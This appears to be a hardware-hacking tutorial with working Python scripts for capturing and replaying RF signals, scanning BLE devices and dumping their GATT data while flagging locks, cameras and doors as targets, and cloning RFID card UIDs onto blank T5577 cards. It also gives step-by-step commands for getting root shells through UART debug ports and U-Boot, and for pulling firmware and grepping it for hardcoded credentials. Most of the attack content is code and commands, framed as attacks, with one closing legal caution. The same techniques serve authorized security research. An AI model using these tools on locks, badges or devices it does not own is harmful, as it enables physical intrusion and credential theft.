// CUSTOM PYTHON RF CAPTURE + REPLAY SCRIPT
#!/usr/bin/env python3
# RF Capture & Replay — connects to Arduino over serial
import serial, time, json, sys

class RFCapture:
  def __init__(self, port="/dev/ttyUSB0", baud=115200):
    self.ser = serial.Serial(port, baud, timeout=2)
    self.signals = []

  def capture(self, duration=10):
    print(f"[*] Listening for RF signals for {duration}s...")
    self.ser.write(b"CAPTURE\n")
    start = time.time()
    while time.time() - start < duration:
      line = self.ser.readline().decode().strip()
      if line.startswith("SIG:"):
        sig = line[4:]
        self.signals.append(sig)
        print(f"[+] Captured: {sig[:40]}...")
    return self.signals

  def replay(self, signal, repeat=3):
    print(f"[*] Replaying signal {repeat}x...")
    for i in range(repeat):
      self.ser.write(f"REPLAY:{signal}\n".encode())
      time.sleep(0.5)
    print("[+] Done. Device should have triggered.")

  def save(self, filename="captured_signals.json"):
    with open(filename, "w") as f:
      json.dump(self.signals, f, indent=2)
    print(f"[+] Saved {len(self.signals)} signals to {filename}")

# Usage
rf = RFCapture()
sigs = rf.capture(duration=15)
if sigs:
  rf.save()
  rf.replay(sigs[0])

# Custom BLE device scanner + GATT enumerator

import asyncio
from bleak import BleakScanner, BleakClient

# Known vulnerable device patterns
TARGETS = ["Lock", "Cam", "Sensor", "Door", "Gate"]

async def scan_and_hunt():
  print("[*] Scanning for BLE devices...")
  devices = await BleakScanner.discover(timeout=10)

  print(f"\n[+] Found {len(devices)} devices:\n")
  for d in sorted(devices, key=lambda x: x.rssi, reverse=True):
    name = d.name or "Unknown"
    flag = " ← INTERESTING" if any(t.lower() in name.lower() for t in TARGETS) else ""
    print(f" {d.rssi:4}dBm | {d.address} | {name}{flag}")

async def enumerate_device(address):
  print(f"\n[*] Connecting to {address}...")
  async with BleakClient(address) as client:
    print(f"[+] Connected! Dumping GATT services:\n")
    for svc in client.services:
      print(f" SERVICE: {svc.uuid}")
      for char in svc.characteristics:
        print(f" CHAR: {char.uuid} | props: {char.properties}")
        if "read" in char.properties:
          try:
            val = await client.read_gatt_char(char.uuid)
            print(f" VALUE: {val.hex()} | {val}")
          except: pass

# pip install mfrc522 RPi.GPIO (for Raspberry Pi)
# or use pyserial to talk to Arduino sketch

import serial, time

class RFIDCloner:
  def __init__(self, port="/dev/ttyUSB0"):
    self.ser = serial.Serial(port, 9600, timeout=5)
    self.captured_uid = None

  def read_card(self):
    print("[*] Hold card near reader...")
    self.ser.write(b"READ\n")
    response = self.ser.readline().decode().strip()
    if response.startswith("UID:"):
      self.captured_uid = response[4:]
      print(f"[+] Card UID: {self.captured_uid}")
      return self.captured_uid
    return None

  def clone_to_blank(self):
    if not self.captured_uid:
      print("[-] No card captured yet. Run read_card() first.")
      return
    print("[*] Now hold blank T5577 card near reader...")
    self.ser.write(f"WRITE:{self.captured_uid}\n".encode())
    result = self.ser.readline().decode().strip()
    print(f"[+] Clone result: {result}")

# Usage
cloner = RFIDCloner()
cloner.read_card()
cloner.clone_to_blank()

// SERIAL DEBUG EXPLOITATION
UART ATTACKS
Universal Asynchronous Receiver-Transmitter — the most common hardware attack vector. Many devices leave debug consoles wide open.
// What is UART?
UART is a simple serial communication protocol — just 2 wires (TX and RX) plus ground. Manufacturers use it for debug output during development, and often forget to disable it in production firmware. Finding it = free shell access on many devices.
TX (Transmit)
Device sends data out. Connect to RX on your adapter.
RX (Receive)
Device receives data in. Connect to TX on your adapter.
GND (Ground)
Common ground. Always connect this first.
VCC (Optional)
Power. Usually DON'T connect — device is already powered.
// Step-by-Step Attack Process
1
Visual inspection — find test points
Look for a row of 3–4 through-hole pads or unpopulated headers on the PCB. Often labeled "J1", "DEBUG", "UART", or "CON". Sometimes just bare solder pads. Use good lighting and magnification.
2
Identify pins with a multimeter
GND: continuity to metal shielding or known ground.
VCC: ~3.3V or 5V when device is powered.
TX: fluctuates ~0–3.3V during boot (sends data).
RX: usually stays high (~3.3V) when idle.
P1GND0V — continuity to chassis
P2VCC3.3V — steady high
P3TXVoltage fluctuates on boot
P4RXHigh when idle (~3.3V)
3
Find the baud rate
Connect your logic analyzer to the TX pin and capture boot output. Use a logic analyzer software like PulseView or Saleae Logic. Common rates to try: 115200, 9600, 57600, 38400. Or just brute-force it.
# Common baud rates to try (most devices use 115200)
baudrate_list = [115200, 9600, 57600, 38400, 19200, 4800]

# With a logic analyzer in PulseView:
# Decoder → UART → set baud rate → observe output
4
Connect USB-UART adapter & open terminal
Wire: Device TX → Adapter RX, Device RX → Adapter TX, Device GND → Adapter GND. Then open a serial terminal.
# Linux — find your adapter
ls /dev/ttyUSB* # CH340 / CP2102
ls /dev/ttyACM* # Arduino

# Open serial console (replace 115200 with your baud rate)
screen /dev/ttyUSB0 115200
# or
minicom -D /dev/ttyUSB0 -b 115200
# or
picocom -b 115200 /dev/ttyUSB0
5
Get your shell — exploit it
Reboot the device. Watch boot logs scroll. Many devices drop straight into a root shell. Others show a U-Boot bootloader prompt — that's even better.
# Common things you'll see
BusyBox v1.26.2 built-in shell (ash)
Enter 'help' for a list of built-in commands.

# ← ROOT SHELL. You win.

# If U-Boot prompt appears:
Hit any key to stop autoboot: 3
# Press a key fast! Then:
printenv # dump all env vars
run bootargs # see kernel args
⚡ REAL
TP-Link, D-Link, Netgear, and tons of cheap IP cameras all have exposed UART debug ports. Search "[router model] UART pinout" and someone's probably already mapped the pins. You just need to connect and reboot.
✓ TIP
If the device has no UART debug shell but has U-Boot, you can often modify the bootargs to boot into single-user mode or disable root password check entirely.

// BINARY ANALYSIS & EXTRACTION
FIRMWARE EXTRACTION
Pull the firmware from flash chips or download it from the vendor. Then tear it apart to find hardcoded creds, vulnerabilities, and secrets.
// Two Ways to Get Firmware
Method A — Download (Easy)
Most vendors post firmware update files on their website. Download, rename to .bin, and start analyzing. No hardware needed.
Method B — Extract from Flash Chip
When no update available or firmware is encrypted. Use SPI clip + Bus Pirate / Raspberry Pi to dump the flash chip directly.
// Method A — Analyze Downloaded Firmware
1
Initial recon with binwalk
Binwalk scans the binary for known file signatures and compression headers.
# Scan — see what's inside
binwalk firmware.bin

DECIMAL HEX DESCRIPTION
0 0x0 LZMA compressed data
1835008 0x1C0000 Squashfs filesystem, little endian
6815744 0x680000 JFFS2 filesystem data

# Extract everything
binwalk -e --run-as=root firmware.bin
cd _firmware.bin.extracted/
2
Explore the filesystem
You'll usually find a full Linux filesystem — /etc, /bin, /var, everything. Start looking for credentials and config files.
# Hunt for passwords
cat squashfs-root/etc/passwd
cat squashfs-root/etc/shadow

# Find hardcoded credentials
grep -r "password" squashfs-root/ 2>/dev/null
grep -r "admin" squashfs-root/etc/ 2>/dev/null
grep -r "secret" squashfs-root/ 2>/dev/null

# Find all binaries (for later RE)
find squashfs-root/ -type f -executable | head -30
3
Strings analysis on binaries
Even compiled binaries leak info through embedded strings — URLs, API keys, debug messages, credentials.
# Dump strings from a binary
strings squashfs-root/bin/httpd | grep -i "pass\|key\|secret\|token\|auth"

# Check file type before RE
file squashfs-root/bin/httpd
httpd: ELF 32-bit LSB executable, MIPS

# Check for crypto keys, entropy spikes
binwalk -E squashfs-root/bin/httpd # entropy graph
4
Reverse engineer with Ghidra
Load the main binary into Ghidra. It decompiles MIPS/ARM/x86 to readable C-like pseudocode. Look for auth functions, strcmp calls, hardcoded keys.
# Install Ghidra (already on Kali)
ghidra

# In Ghidra:
# 1. New Project → Import firmware binary
# 2. Auto-analyze (let it run)
# 3. Symbol Tree → Functions → search "auth" / "login"
# 4. Look for strcmp() with hardcoded strings
# 5. Decompiler window shows C-like pseudocode
// Method B — Physical Flash Chip Extraction
1
Identify the flash chip
Look for a small 8-pin IC on the PCB, usually labeled with a part number like W25Q64, MX25L6406, or GD25Q64. Google the datasheet.
2
Clip on and dump with flashrom
Use an SPI clip (SOIC-8 clip) to connect to the chip without desoldering. Power the clip from your Pi/Bus Pirate, not the device.
# Raspberry Pi as SPI programmer
flashrom -p linux_spi:dev=/dev/spidev0.0,spispeed=1000 -r dump.bin

# Bus Pirate
flashrom -p buspirate_spi:dev=/dev/ttyUSB0,spispeed=1M -r dump.bin

# Verify dump
binwalk dump.bin
✓ TIP
Always start with Method A — download from vendor site. Use firmwalker after extraction — it auto-hunts for credentials, private keys, SSL certs, and web server configs across the entire filesystem.
! TOOL
Install EMBA (Embedded Analyzer) — it automates a ton of firmware analysis: CVE lookup for detected packages, hardcoded creds, outdated libraries, config file auditing. Like running an automated pentest on firmware.

⚡ REAL
125 kHz cards (used in many office buildings, parking garages) have ZERO encryption. Read them from up to 10cm away with a hidden reader. This is why modern buildings upgrade to MIFARE or DESFire cards — those are much harder to clone.
! LAW
Only do RF attacks on your own devices or with explicit written permission. Transmitting on certain frequencies without a license is illegal in many countries including Cambodia. Passive receiving (RTL-SDR listening) is generally fine. Never replay signals to bypass security you don't own.
